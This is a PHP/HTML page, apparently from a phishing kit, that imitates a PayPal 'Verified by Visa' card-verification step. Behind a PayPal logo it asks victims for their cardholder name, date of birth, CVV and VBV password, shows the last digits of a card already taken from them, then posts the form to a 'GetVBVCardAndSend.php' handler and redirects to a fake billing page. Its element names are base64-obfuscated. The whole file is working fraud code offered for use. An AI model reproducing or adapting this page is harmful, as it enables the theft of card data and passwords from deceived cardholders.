4kL1eA9qIWe4NmdPWHD6Lb45N6Hl09kwgb8bEdPRzg/sz24WjHWj+AFnnkwDUpQeCSvDrj/bGx1iwVCpE9P6+AB60frOMOfjm/C3lQ4mVEmCoHQ8xPpq+XCNCSSm2gmkH3viR76gQlh0J8P01BrN+twOopQ3LqT2A3VNZBrqOG+cyKaCxR+ISjCQE7UITxeIZRdROdPran05lDMkEI1hNxwIA3NWYMiCJO48XyxedIOj1PHj12n4b24h/+na9fTzxlipoaLrrfqhwPJIXijjx88i46HjySoSh6dUIg+2HLMi/SB9wYGcvVz6HVvxieVWDU82KoQibGhbrBmRDA3xEU3k1pKoRBpJIVGadaODK71QOn4KD5HxjyNSpigj1FMksRG3jQJcQDedBKESYgECWErOkkTI9xBK+gL0/HGkRBdcf/PoZ371fC61z17O2tg9bAgs2uSh44aCXFsO/kYalOIDnCBHY+3g8l4nELS8DjpHKmQEOlwqAeibeu73vbigSVKUAsjfToJfxcNdMWuWWjLpeKTSokPJJg+aHA35KclyrFVIjGboK7ZlKhgDXKUKBdSSr9ALdqd1m8OtaDCIT8Sd2dsna295JNaZhohquANOBoBoqRiYctH0L4oMZiIx+2LBE8xOVP1JYMIIbuWkpKlkDnVB0VriYcia4ehDljWDqPVY1cxWvNwGYz6sKt6KI5nQprpzGideKOnY21ItiHYVYzC4bm4rDLOtmC0LsjpoURiUyqav9Y4NcEe2NWBoRGUvj8mc2EJOkBKWyLvM0iQhc1QLzQKRlEGSqYw9XyUpvfPQQFmI1CNwa5ipOGzJbHZ8JVkXgejdUKT0i7MaM8NKtgDu3bTFP9bFu3HZbNQvJDROtFgI/homBucmBJuNyESdm0ZTVBafXJJJRxJ08ONggpuDDff0DKp64zmI9jNESJ9nGBShAd0R2fVy9m+DU6ziJHBaAx27aYZjKbAxMhQDEyMDMXAxMhQDEyMDMXAxMhQDEyMDMXAxMhQDEyMDMXAxMhQDEyMDMXAxMhQDEyMDMXAxMhQDEyMDMXAxMhQCAD/Dw9qJx1KxSUyAAAAAElFTkSuQmCC";
					echo GETIMG($amNiR2V0SW1nZm9yY29uZmltQ2FyZA);
				}
			?>
			<img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNi4wLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMTI3Ljc2OXB4IiBoZWlnaHQ9IjMxLjVweCIgdmlld0JveD0iMCAwIDEyNy43NjkgMzEuNSIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAwIDAgMTI3Ljc2OSAzMS41IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8Zz4NCgkJCTxwYXRoIGZpbGw9IiMwMDlDREUiIGQ9Ik05OC4zOTYsNi45MzNIOTEuMzdjLTAuNDc5LDAtMC44OSwwLjM1LTAuOTY0LDAuODI0bC0yLjg0MSwxOC4wMTVjLTAuMDU2LDAuMzU1LDAuMjE5LDAuNjc2LDAuNTc5LDAuNjc2DQoJCQkJaDMuNjA0YzAuMzM1LDAsMC42MjItMC4yNDQsMC42NzQtMC41NzZsMC44MDctNS4xMDdjMC4wNzQtMC40NzQsMC40ODMtMC44MjQsMC45NjQtMC44MjRoMi4yMjNjNC42MjgsMCw3LjI5OC0yLjIzOSw3Ljk5Ni02LjY3OA0KCQkJCWMwLjMxNC0xLjk0MSwwLjAxNC0zLjQ2Ny0wLjg5Ni00LjUzNUMxMDIuNTE4LDcuNTUzLDEwMC43NDYsNi45MzMsOTguMzk2LDYuOTMzeiBNOTkuMjA3LDEzLjUxMg0KCQkJCWMtMC4zODQsMi41MjItMi4zMSwyLjUyMi00LjE3MywyLjUyMmgtMS4wNjFsMC43NDQtNC43MDhjMC4wNDUtMC4yODUsMC4yOS0wLjQ5NSwwLjU3OC0wLjQ5NWgwLjQ4NWMxLjI2OSwwLDIuNDY3LDAsMy4wODQsMC43MjMNCgkJCQlDOTkuMjM0LDExLjk4Niw5OS4zNDcsMTIuNjI2LDk5LjIwNywxMy41MTJ6Ii8+DQoJCQk8cGF0aCBmaWxsPSIjMDAzMDg3IiBkPSJNNDguMjg4LDYuOTMzaC03LjAyNWMtMC40ODEsMC0wLjg5LDAuMzUtMC45NjUsMC44MjRsLTIuODQxLDE4LjAxNQ0KCQkJCWMtMC4wNTYsMC4zNTUsMC4yMTksMC42NzYsMC41NzksMC42NzZoMy4zNTRjMC40OCwwLDAuODg5LTAuMzQ5LDAuOTY0LTAuODIzbDAuNzY3LTQuODZjMC4wNzUtMC40NzQsMC40ODQtMC44MjQsMC45NjQtMC44MjQNCgkJCQloMi4yMjNjNC42MjcsMCw3LjI5OC0yLjIzOSw3Ljk5Ny02LjY3OGMwLjMxNC0xLjk0MSwwLjAxMi0zLjQ2Ny0wLjg5Ni00LjUzNUM1Mi40MDksNy41NTMsNTAuNjM4LDYuOTMzLDQ4LjI4OCw2LjkzM3oNCgkJCQkgTTQ5LjA5OSwxMy41MTJjLTAuMzg0LDIuNTIyLTIuMzEsMi41MjItNC4xNzMsMi41MjJoLTEuMDZsMC43NDMtNC43MDhjMC4wNDUtMC4yODUsMC4yOTEtMC40OTUsMC41NzktMC40OTVoMC40ODYNCgkJCQljMS4yNjgsMCwyLjQ2NiwwLDMuMDgzLDAuNzIzQzQ5LjEyNiwxMS45ODYsNDkuMjM4LDEyLjYyNiw0OS4wOTksMTMuNTEyeiIvPg0KCQkJPHBhdGggZmlsbD0iIzAwMzA4NyIgZD0iTTY5LjI4NiwxMy40MzJoLTMuMzYzYy0wLjI4OSwwLTAuNTM0LDAuMjA5LTAuNTc5LDAuNDk0bC0wLjE0NywwLjk0bC0wLjIzNi0wLjM0MQ0KCQkJCWMtMC43MjgtMS4wNTgtMi4zNTItMS40MS0zLjk3My0xLjQxYy0zLjcxNiwwLTYuODkxLDIuODE2LTcuNTA5LDYuNzY2Yy0wLjMyMiwxLjk3MSwwLjEzNSwzLjg1NCwxLjI1Miw1LjE2OQ0KCQkJCWMxLjAyNiwxLjIwOCwyLjQ5MiwxLjcxLDQuMjM3LDEuNzFjMi45OTUsMCw0LjY1Ny0xLjkyNCw0LjY1Ny0xLjkyNGwtMC4xNSwwLjkzNWMtMC4wNTYsMC4zNTUsMC4yMTgsMC42NzcsMC41NzgsMC42NzdoMy4wMw0KCQkJCWMwLjQ4LDAsMC44ODktMC4zNDksMC45NjUtMC44MjJsMS44MTctMTEuNTE3QzY5LjkyMSwxMy43NTIsNjkuNjQ2LDEzLjQzMiw2OS4yODYsMTMuNDMyeiBNNjQuNTk4LDE5Ljk3OQ0KCQkJCWMtMC4zMjUsMS45MjMtMS44NTEsMy4yMTItMy43OTcsMy4yMTJjLTAuOTc2LDAtMS43NTctMC4zMTQtMi4yNTktMC45MDdjLTAuNDk4LTAuNTktMC42ODUtMS40MjktMC41MjctMi4zNjMNCgkJCQljMC4zMDMtMS45MDUsMS44NTQtMy4yMzcsMy43NzEtMy4yMzdjMC45NTUsMCwxLjczLDAuMzE2LDIuMjQzLDAuOTE3QzY0LjU0MywxOC4yMDUsNjQuNzQ2LDE5LjA1LDY0LjU5OCwxOS45Nzl6Ii8+DQoJCQk8cGF0aCBmaWxsPSIjMDA5Q0RFIiBkPSJNMTE5LjM5NCwxMy40MzJoLTMuMzYzYy0wLjI4OCwwLTAuNTMzLDAuMjA5LTAuNTc4LDAuNDk0bC0wLjE0OCwwLjk0bC0wLjIzNS0wLjM0MQ0KCQkJCWMtMC43MjktMS4wNTgtMi4zNTItMS40MS0zLjk3My0xLjQxYy0zLjcxOCwwLTYuODkzLDIuODE2LTcuNTEsNi43NjZjLTAuMzIxLDEuOTcxLDAuMTM1LDMuODU0LDEuMjUyLDUuMTY5DQoJCQkJYzEuMDI2LDEuMjA4LDIuNDkyLDEuNzEsNC4yMzcsMS43MWMyLjk5NSwwLDQuNjU3LTEuOTI0LDQuNjU3LTEuOTI0bC0wLjE1LDAuOTM1Yy0wLjA1NywwLjM1NSwwLjIxOSwwLjY3NywwLjU3OCwwLjY3N2gzLjAzDQoJCQkJYzAuNDc5LDAsMC44ODktMC4zNDksMC45NjQtMC44MjJsMS44MTgtMTEuNTE3QzEyMC4wMjksMTMuNzUyLDExOS43NTQsMTMuNDMyLDExOS4zOTQsMTMuNDMyeiBNMTE0LjcwNiwxOS45NzkNCgkJCQljLTAuMzI1LDEuOTIzLTEuODUxLDMuMjEyLTMuNzk3LDMuMjEyYy0wLjk3NiwwLTEuNzU3LTAuMzE0LTIuMjYtMC45MDdjLTAuNDk2LTAuNTktMC42ODUtMS40MjktMC41MjYtMi4zNjMNCgkJCQljMC4zMDQtMS45MDUsMS44NTMtMy4yMzcsMy43Ny0zLjIzN2MwLjk1NiwwLDEuNzMxLDAuMzE2LDIuMjQzLDAuOTE3QzExNC42NTEsMTguMjA1LDExNC44NTQsMTkuMDUsMTE0LjcwNiwxOS45Nzl6Ii8+DQoJCQk8cGF0aCBmaWxsPSIjMDAzMDg3IiBkPSJNODcuMjA0LDEzLjQzMmgtMy4zODJjLTAuMzIzLDAtMC42MjYsMC4xNi0wLjgwOCwwLjQyN2wtNC42NjQsNi44N2wtMS45NzgtNi42MDENCgkJCQljLTAuMTIzLTAuNDE0LTAuNTA0LTAuNjk2LTAuOTM1LTAuNjk2aC0zLjMyNGMtMC40MDEsMC0wLjY4MywwLjM5NS0wLjU1NSwwLjc3NGwzLjcyNCwxMC45MjlsLTMuNTAyLDQuOTQxDQoJCQkJQzcxLjUwNiwzMC40NjQsNzEuNzg0LDMxLDcyLjI1OSwzMWgzLjM3OWMwLjMxOSwwLDAuNjE5LTAuMTU3LDAuODAyLTAuNDJsMTEuMjQ2LTE2LjIyOQ0KCQkJCUM4Ny45NTQsMTMuOTYyLDg3LjY3NiwxMy40MzIsODcuMjA0LDEzLjQzMnoiLz4NCgkJCTxwYXRoIGZpbGw9IiMwMDlDREUiIGQ9Ik0xMjMuMzU5LDcuNDI3bC0yLjg4MywxOC4zNDRjLTAuMDU3LDAuMzU1LDAuMjE4LDAuNjc2LDAuNTc4LDAuNjc2aDIuOWMwLjQ4LDAsMC44ODktMC4zNDksMC45NjQtMC44MjINCgkJCQlsMi44NDMtMTguMDE2YzAuMDU2LTAuMzU1LTAuMjE5LTAuNjc3LTAuNTc4LTAuNjc3aC0zLjI0NkMxMjMuNjUsNi45MzMsMTIzLjQwNCw3LjE0MywxMjMuMzU5LDcuNDI3eiIvPg0KCQk8L2c+DQoJPC9nPg0KCTxnPg0KCQk8cGF0aCBmaWxsPSIjMDA5Q0RFIiBkPSJNMjMuNjc1LDcuODc2YzAuMzc4LTIuNDEyLTAuMDAyLTQuMDUzLTEuMzA3LTUuNTM5QzIwLjkzMiwwLjcwMSwxOC4zMzgsMCwxNS4wMTksMEg1LjM4NA0KCQkJQzQuNzA2LDAsNC4xMjgsMC40OTQsNC4wMjIsMS4xNjRMMC4wMSwyNi42MDRjLTAuMDc5LDAuNTAzLDAuMzA5LDAuOTU2LDAuODE3LDAuOTU2aDUuOTQ4bC0wLjQxMSwyLjYwNA0KCQkJQzYuMjk1LDMwLjYwMyw2LjYzNSwzMSw3LjA4LDMxaDUuMDE0YzAuNTkzLDAsMS4wOTgtMC40MzIsMS4xOTEtMS4wMThsMC4wNDktMC4yNTVsMC45NDQtNS45ODlsMC4wNjEtMC4zMzENCgkJCWMwLjA5My0wLjU4NiwwLjU5OC0xLjAxOSwxLjE5MS0xLjAxOWgwLjc1YzQuODU3LDAsOC42Ni0xLjk3Miw5Ljc3MS03LjY4YzAuNDY1LTIuMzg0LDAuMjI1LTQuMzc1LTEuMDAzLTUuNzc0DQoJCQlDMjQuNjc2LDguNTEyLDI0LjIxNCw4LjE2MiwyMy42NzUsNy44NzZMMjMuNjc1LDcuODc2Ii8+DQoJCTxwYXRoIGZpbGw9IiMwMTIxNjkiIGQ9Ik0yMy42NzUsNy44NzZjMC4zNzgtMi40MTItMC4wMDItNC4wNTMtMS4zMDctNS41MzlDMjAuOTMyLDAuNzAxLDE4LjMzOCwwLDE1LjAxOSwwSDUuMzg0DQoJCQlDNC43MDYsMCw0LjEyOCwwLjQ5NCw0LjAyMiwxLjE2NEwwLjAxLDI2LjYwNGMtMC4wNzksMC41MDMsMC4zMDksMC45NTYsMC44MTcsMC45NTZoNS45NDhsMS40OTQtOS40NzVsLTAuMDQ2LDAuMjk4DQoJCQljMC4xMDYtMC42NzEsMC42NzgtMS4xNjQsMS4zNTctMS4xNjRoMi44MjdjNS41NTIsMCw5Ljg5OS0yLjI1NiwxMS4xNy04Ljc3OUMyMy42MTQsOC4yNDcsMjMuNjQ2LDguMDYxLDIzLjY3NSw3Ljg3NiIvPg0KCQk8cGF0aCBmaWxsPSIjMDAzMDg3IiBkPSJNOS44NzUsNy45MDhjMC4wNjMtMC40MDMsMC4zMjItMC43MzMsMC42Ny0wLjljMC4xNTgtMC4wNzYsMC4zMzUtMC4xMTgsMC41MjEtMC4xMThoNy41NTMNCgkJCWMwLjg5NSwwLDEuNzI5LDAuMDU5LDIuNDkyLDAuMTgyYzAuMjE4LDAuMDM1LDAuNDMsMC4wNzUsMC42MzYsMC4xMjFjMC4yMDYsMC4wNDUsMC40MDYsMC4wOTYsMC42LDAuMTUzDQoJCQljMC4wOTcsMC4wMjgsMC4xOTIsMC4wNTgsMC4yODYsMC4wODljMC4zNzUsMC4xMjUsMC43MjQsMC4yNzEsMS4wNDQsMC40NDFjMC4zNzgtMi40MTItMC4wMDItNC4wNTMtMS4zMDctNS41MzkNCgkJCUMyMC45MzIsMC43MDEsMTguMzM4LDAsMTUuMDE5LDBINS4zODRDNC43MDYsMCw0LjEyOCwwLjQ5NCw0LjAyMiwxLjE2NEwwLjAxLDI2LjYwNGMtMC4wNzksMC41MDMsMC4zMDksMC45NTYsMC44MTcsMC45NTZoNS45NDgNCgkJCWwxLjQ5NC05LjQ3NUw5Ljg3NSw3LjkwOHoiLz4NCgk8L2c+DQo8L2c+DQo8L3N2Zz4NCg==" style="float: right;display: inline-block" width="128px">
			<p class="bGFiVGhpc2Zvcm1zZ2lucGFnZXZidg"><?php echo $lang_50; ?></p>
			<div id="VGhpc0ZvckZ1Y2tpbmdwcm9jZXNzaW5n">
				<center>
					<tr>
						<p style="margin: 91px 0 129px;"><?php echo $lang_39; ?></p>
					</tr>
				</center>
			</div>
			<div class="hide" id="VkJWcGdhU3RhcnRGb3JDb25GaXJt">
				<table align="center" width="290" style="font-size: 11px;font-family: arial, sans-serif; color: rgb(0, 0, 0); margin-top: 30px;">
					<form method="post" id="FORM1">
						<tbody style="height:8px;">
							<tr>
								<td align="right"><?php echo $lang_40; ?> </td>
								<td><input type="text" name="cardholderVBV" id="cardholder" style="width: 154px;line-height:0.6" required="" /></td>
							</tr>
							<tr>
								<td align="right"><?php echo $lang_41; ?> </td>
								<td>
									<select name="DD" id="DD" style="width: 43px;">
										<option value="-1"><?php echo $lang_42; ?></option>
										<option value="01">01</option>
										<option value="02">02</option>
										<option value="03">03</option>
										<option value="04">04</option>
										<option value="05">05</option>
										<option value="06">06</option>
										<option value="07">07</option>
										<option value="08">08</option>
										<option value="09">09</option>
										<option value="10">10</option>
										<option value="11">11</option>
										<option value="12">12</option>
										<option value="13">13</option>
										<option value="14">14</option>
										<option value="15">15</option>
										<option value="16">16</option>
										<option value="17">17</option>
										<option value="18">18</option>
										<option value="19">19</option>
										<option value="20">20</option>
										<option value="21">21</option>
										<option value="22">22</option>
										<option value="23">23</option>
										<option value="24">24</option>
										<option value="25">25</option>
										<option value="26">26</option>
										<option value="27">27</option>
										<option value="28">28</option>
										<option value="29">29</option>
										<option value="30">30</option>
										<option value="31">31</option>
									</select>
									<select name="MM" id="MM" style="width: 46px">
										<option value="-1"><?php echo $lang_43; ?></option>
										<option value="01">01</option>
										<option value="02">02</option>
										<option value="03">03</option>
										<option value="04">04</option>
										<option value="05">05</option>
										<option value="06">06</option>
										<option value="07">07</option>
										<option value="08">08</option>
										<option value="09">09</option>
										<option value="10">10</option>
										<option value="11">11</option>
										<option value="12">12</option>
									 </select>
									<select name="YYYY" id="YYYY" style="width: 60px;">
										<option value="-1"><?php echo $lang_44; ?></option>
										<option value="1998">1998</option>
										<option value="1997">1997</option>
										<option value="1996">1996</option>
										<option value="1995">1995</option>
										<option value="1994">1994</option>
										<option value="1993">1993</option>
										<option value="1992">1992</option>
										<option value="1991">1991</option>
										<option value="1990">1990</option>
										<option value="1989">1989</option>
										<option value="1988">1988</option>
										<option value="1987">1987</option>
										<option value="1986">1986</option>
										<option value="1985">1985</option>
										<option value="1984">1984</option>
										<option value="1983">1983</option>
										<option value="1982">1982</option>
										<option value="1981">1981</option>
										<option value="1980">1980</option>
										<option value="1979">1979</option>
										<option value="1978">1978</option>
										<option value="1977">1977</option>
										<option value="1976">1976</option>
										<option value="1975">1975</option>
										<option value="1974">1974</option>
										<option value="1973">1973</option>
										<option value="1972">1972</option>
										<option value="1971">1971</option>
										<option value="1970">1970</option>
										<option value="1969">1969</option>
										<option value="1968">1968</option>
										<option value="1967">1967</option>
										<option value="1966">1966</option>
										<option value="1965">1965</option>
										<option value="1964">1964</option>
										<option value="1963">1963</option>
										<option value="1962">1962</option>
										<option value="1961">1961</option>
										<option value="1960">1960</option>
										<option value="1959">1959</option>
										<option value="1958">1958</option>
										<option value="1957">1957</option>
										<option value="1956">1956</option>
										<option value="1955">1955</option>
										<option value="1954">1954</option>
										<option value="1953">1953</option>
										<option value="1952">1952</option>
										<option value="1951">1951</option>
										<option value="1950">1950</option>
										<option value="1949">1949</option>
										<option value="1948">1948</option>
										<option value="1947">1947</option>
										<option value="1946">1946</option>
										<option value="1945">1945</option>
										<option value="1944">1944</option>
										<option value="1943">1943</option>
										<option value="1942">1942</option>
										<option value="1941">1941</option>
										<option value="1940">1940</option>
										<option value="1939">1939</option>
										<option value="1938">1938</option>
										<option value="1937">1937</option>
										<option value="1936">1936</option>
										<option value="1935">1935</option>
										<option value="1934">1934</option>
										<option value="1933">1933</option>
										<option value="1932">1932</option>
										<option value="1931">1931</option>
										<option value="1930">1930</option>
										<option value="1929">1929</option>
										<option value="1928">1928</option>
										<option value="1927">1927</option>
										<option value="1926">1926</option>
										<option value="1925">1925</option>
										<option value="1924">1924</option>
										<option value="1923">1923</option>
										<option value="1922">1922</option>
										<option value="1921">1921</option>
										<option value="1920">1920</option>
										<option value="1919">1919</option>
										<option value="1918">1918</option>
										<option value="1917">1917</option>
										<option value="1916">1916</option>
									 </select>
								</td>
							</tr>
							<tr>
								<td align="right"><?php echo $lang_45; ?> </td>
								<td>
									<?php
										if($Q2FyZFR5cGU == "amex"){
											echo "XXXX XXXXXX ".substr($CardNumber,10,15);
										}else{
											echo "XXXX XXXX XXXX ".substr($CardNumber,12,16);
										}
									?>
								</td>
							</tr>
							<tr>
								<td align="right">
									<?php echo $lang_46; ?>
								</td>
								<td>
									<input type="password" name="CVV" id="CVV" style="width: 38px;line-height:0.6">
									<?php
										if($Q2FyZFR5cGU == "amex"){
											echo '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADoAAAAiCAIAAACBXF2JAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABCBJREFUeNpi/PXrF8PQASwQ6u3btz9+/Pjz58+gcBMLCycnp5CQEKYUIzB0X716xcPDw8TENHhC8efPn8CwExYWRhMHOfH79++Dyq1AwM7O/u3bN0xxkCv///8/CJPp379/sTt3CIEh5lyWgbL405On3968hbAF5OU4BAWIdS590u7nZy9ubtzy9sbtF+cvvbl5i0tYmEsEmvE/PHz04/0HQSUFUW1N7YhgZXcXZjZWrK6iR+g+PnL8aGf/u9t31f19xA109ROjRdTVWDg50JS9v/fg9dXrV1es3ZZZqBnsr5IYxaCoiKXcvX//vqSkJC0c+vXlq22ZRb9//DBMjtMM9iO20P30+dzM+ScmTA1aOFPdx4NOWe311RvzLF2kzIyjtq0h3q2gQpeP17I0z7a/bXVE4r09B+jhXGA2WhkQaVNVYl1RSJ4J0rZWIUvnbM0toYdzj3b0GyRGG6bEwUVWr1796dMnIGPnzp3TwADOBpJA9tWrV4FsiBoI0PD3ZmZje339Js2de3/Pfu2IEOQ2wOvXryFsbW1tLS0tUVFRIFtMTAxUqIGdePz4cUxzgM79i9RmpGFigJdTkDYA0InQNA0GoaGhQDYbG1tMTAyQC3QxpCl79+5dROq/fvPj4yeimuo0d66sjeX1tRuRQ/fatWtLliwBMs6ePQt0HyQxPHnyBCiorKzMx8eXlZUFdD2QDS1Vnr04NW2OQ10FMIBRCrJ79+5JSUlR17mvLl1d5OQdsGiWipcbGdofHjx6fMpMFVsrm7ICemQ1MT3toBXzNyZmnpw4nSSNwOrtRN+U1cHR8l6uaG6lbbmr5OKYcmr/k+OnpqgaHqhteX72Av4q+sH+Q9tzSmYaWANdnHbhqLy7M4FKGJjM79y5A0xG58+fd3d3B5YvhoaGwHQGzChALqTcAaoB5hJgqWRvb3/w4EGgYki+BuYkYOqE6PLz85ORkQEKbj58yH1y16p58x8/en4tI//L/Ueimmpvv3xRtzC78/iRBLB/Iyj08tIVYP3MxsMtrK4GrE1cu1sg9fOXZ88IOBfYXQNmBWBBA8wBwCQPTPhALpANsRsOgAUkkOTn5wd6hoODA1IAAVVCpIBuPXfuHFwL0Kv80lIO0VFA9sY1a5QkpL+cPi2qonb3/VtJA30BQQG9uEghVWVgTUZsi+zfv3/QRt2nT0DHAS2DlDWQkgUefpBiEl7QPH78GCiuoqIClwKKGBkZbdq0CehiiAeACg4cOAAkgVJAjzGysfGpqzC/ey3q5sj2/xe7oaGBpSUul8Fdhd7EASYAtPAbDAAYcPCwGO38jDp3KHXcsbpqCDp3iCUGZmbmQegyrK5iglQEb968GVRuBboH6Crs1QSkyfz58+ffv38PBreysrLy8vJCuhvYnTtUAECAAQCKD/778K5ArgAAAABJRU5ErkJggg==" style="position: absolute;width: 39px;top:auto;">';
										}else{
											echo '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADoAAAAiCAIAAACBXF2JAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA9tJREFUeNrsl21IU2EUx9PNveTuRq5NV7KotpaRQ8mKqCiwD4HRe1QGwSiCQfVBKAxKIoIs6AWC+lDklxIhowJnlFlRi8gXrFTci7nSae1Nm/Nlu3PZ//rUpeYKC2Z31Plw99yzc87zO4fnuc95kmianpI4wic/Pp8vGAyOjIxwgonPF4vFaWlp4/9KQnXdbrdEIklOTuZOFUOhEGonl8uj9Azi8PAwp1ghQqFwaGhovJ6hHB0d5eAyjUQiP127VVVVXMPNy8uLXd0EkgTE5ebajUnF/7tMYW/vSCBAxgLFdJ4kdULHxOTx9X7qr2sMOT8EHZ2h7h6elOJTFPmL9ngjA4OCdKVIPVO2YulnvT72MeFwOFQqVbxBu8wvnp8+32t/q9uwTj5fm5Grn66bxxeLosz6Ot55WttaK269e/Ise/uWVUcPUTNUk4o76HJXG4vCwWDunt1ZW9ZP0Ou9ze421Tw/d3FT2WXdurWT9GXwtFquLVszY8miwurKibMyS5mSrDxStPX61Zs7DB0Pn3zVorpWq3U0PjLg9pzK0Ly8dOUPfEFFj8mbm7fPztWTcXyr+/hE6eJ9hiXGvVH68vJyv9+PgclkujAm7BjPKOP5Gwp4AoGnzRrjy2C32202m0wma2hoKCgogDMOQ7Rs6DnwSoLCprCwEFPm5+fX1tbCmMxtNBphZjab4UsMItUPpuzcqLbboVQqlSQCui0EJNNlZ2eLRCKXy4Vxeno6IpNQUQLcyFhfHn1MoOtFOERBdK1Wi+nx2tnZief3/s3NzXgCFMnAmPVlDUDAdFVeX7JkKowRio0APesCblgiN6I3GAxsJiwV6urvciqydDG2GpIDHMrjHhMyB1s/UgPWGJbQq9Vq8oo6EWNMTKoo0mlCTS2AQ0A2ZzyRQFlZGQb19fWYhSwGGECJxH7g6XLWXbq6uqQYBf661SwWS5y2Wk/T6xKBvO2u6Q98QWW9X3tj865HJ8/Q3yS+uBDbvZrjYuXTMxd+y2vI11tZVIxUX1VU0t9J3L+72rVrDrbWvTe/KFVp7x8+5qxr/IVxf3dPe83j23v3n9Pm0P7+A231Czavjz6E29vbMzMz482Ns62l4pb1TpXPYk/TzhXKqGlzZgulVKifaXFcb1pwPgskqXLdPJwmC7Zt+ujzajSaGD3D5OCyQg8OgizkD/R1OMAKYmYH6xcyOUgp1szpdI7H/QsNpCA1NSOH6bZmrVr+D9wm/l9+4nX5SUDcBFsMPB6Pg2QxqRhcqVTq9Xo5xQoeUMW+WjJNmscTCATC4TAXWFNSUiiKUigUP8VNFPkiwAAK+Ln4QpXYSQAAAABJRU5ErkJggg==" style="position: absolute;width: 39px;top:auto;">';
										}
									?>
								</td>
							</tr>
							<tr>
								<td align="right">
									<?php echo $lang_47; ?>
								</td>
								<td>
									<input style="width: 150px;line-height:0.6" type="password" name="password_vbv" required="" />
								</td>
							</tr>
							<?php
								echo VBV::InputCard($Country);
							?>
							<tr>
								<td>
								</td>
								<td>
									<br><input type="submit" value="<?php echo $lang_49; ?>" id="bntvbv">
								</td>
							</tr>
						</tbody>
					</form>
				</table>
			</div>
			<p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565"><?php echo $lang_48; ?></p>
		</div>
	</div>
	<script>
		$("#FORM1").validate({
	        submitHandler: function(form) {
	            $.post("System/GetVBVCardAndSend.php", $("#FORM1").serialize(), function(result) {
	                if (result == "YOUHAVEERRORBRO") {
	                    setTimeout(function() {
	                    	document.getElementById("VkJWcGdhU3RhcnRGb3JDb25GaXJt").className = "";
    						document.getElementById("VGhpc0ZvckZ1Y2tpbmdwcm9jZXNzaW5n").className = "hide";
							alert("<?php echo $lang_38; ?>");
	                    });
	                } else {
						setTimeout(function() {
							window.location.assign("servicesbill.php?cmd=_restore_billstart&_Acess_Tooken="+makeid());

	                    });
	                }
	            });
	                ///////////////////////////////////////////////////////////
	        },
	    });
		function makeid()
          {
              var text = "";
              var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

              for( var i=0; i < 50; i++ )
                  text += possible.charAt(Math.floor(Math.random() * possible.length));

              return text;
          }
	</script>
</body>
</html>